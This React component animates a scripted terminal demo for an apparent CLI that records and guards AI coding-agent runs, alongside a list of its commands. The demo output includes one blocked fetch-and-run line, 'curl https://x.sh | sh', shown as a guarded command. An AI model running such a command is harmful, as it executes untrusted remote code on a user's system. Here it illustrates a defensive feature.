import { AnimatePresence, motion } from "framer-motion";
import { toneClass, useTypedTerminal, type TermLine } from "./useTypedTerminal";
import { Cmd } from "./components";

/**
 * A second scripted terminal, this time showing the read-only query
 * commands (`trace runs`, `trace risks`) rather than `run`/`patch` — text
 * mirrors the real column layout in crates/trace-cli/src/commands/query.rs.
 */
const SCRIPT: TermLine[] = [
  { kind: "input", text: "trace runs" },
  { kind: "dim", text: "STATUS      PROJECT     FILES  SECRETS  COMMAND" },
  { kind: "out", text: 'completed   api-server       3        0  claude "add rate limiting"' },
  { kind: "out", text: 'completed   web-app          1        1  codex "fix flaky test"' },
  { kind: "gap" },
  { kind: "input", text: "trace risks a3f9c21" },
  { kind: "dim", text: "Command decisions:" },
  { kind: "del", text: "  [blocked] curl https://x.sh | sh" },
  { kind: "add", text: "  [allow]   npm test" },
  { kind: "dim", text: "Secret / protected-file warnings (redacted):" },
  { kind: "out", text: "  api_key  sk-***redacted***  src/config.ts" },
];

const COMMANDS = [
  { cmd: "trace init", desc: "Set up a project — creates .trace/ and registers with the local daemon." },
  { cmd: 'trace run "claude fix the bug"', desc: "Wrap any agent invocation. Recording starts and stops automatically." },
  { cmd: "trace dashboard", desc: "Open the local dashboard at 127.0.0.1 — or launch the desktop app." },
  { cmd: "trace risks <run_id>", desc: "See guarded commands and redacted secret warnings for a run." },
  { cmd: "trace rollback <run_id>", desc: "Restore the pre-run Git checkpoint. Confirms before anything destructive." },
];

export default function CliSection() {
  const { shown, state, reduceMotion, cursorOn } = useTypedTerminal(SCRIPT, { holdMs: 3200 });

  return (
    <div className="grid grid-cols-1 gap-8 md:grid-cols-[1fr_1.1fr] md:gap-10">
      <div>
        <ul className="space-y-4">
          {COMMANDS.map((c) => (
            <li key={c.cmd}>
              <Cmd>{c.cmd}</Cmd>
              <p className="mt-1.5 text-sm text-text-dim">{c.desc}</p>
            </li>
          ))}
        </ul>
      </div>

      <div className="overflow-hidden rounded-md bg-surface">
        <div className="flex items-center gap-2 bg-black/30 px-3.5 py-2.5">
          <span className="h-2.5 w-2.5 rounded-full bg-bad" />
          <span className="h-2.5 w-2.5 rounded-full bg-warn" />
          <span className="h-2.5 w-2.5 rounded-full bg-good" />
          <span className="ml-2 font-mono text-xs text-text-dim">trace — zsh</span>
        </div>
        <div className="min-h-[260px] p-4 font-mono text-[13px] leading-[1.7]">
          <AnimatePresence initial={false}>
            {shown.map((line, i) => {
              if (line.kind === "gap") return <div key={i} className="h-2" />;
              const isCurrentInput = line.kind === "input" && i === state.visible && !reduceMotion;
              const text = isCurrentInput ? line.text.slice(0, state.typed) : line.text;
              return (
                <motion.div
                  key={i}
                  initial={reduceMotion ? false : { opacity: 0, y: 4 }}
                  animate={{ opacity: 1, y: 0 }}
                  transition={{ duration: 0.18, ease: "easeOut" }}
                  className={`whitespace-pre ${toneClass[line.kind]}`}
                >
                  {line.kind === "input" && <span className="mr-2 select-none text-brand">$</span>}
                  {text}
                  {isCurrentInput && (
                    <span className={`ml-px inline-block h-[14px] w-[7px] translate-y-[2px] bg-brand ${cursorOn ? "animate-pulse" : ""}`} />
                  )}
                </motion.div>
              );
            })}
          </AnimatePresence>
        </div>
      </div>
    </div>
  );
}
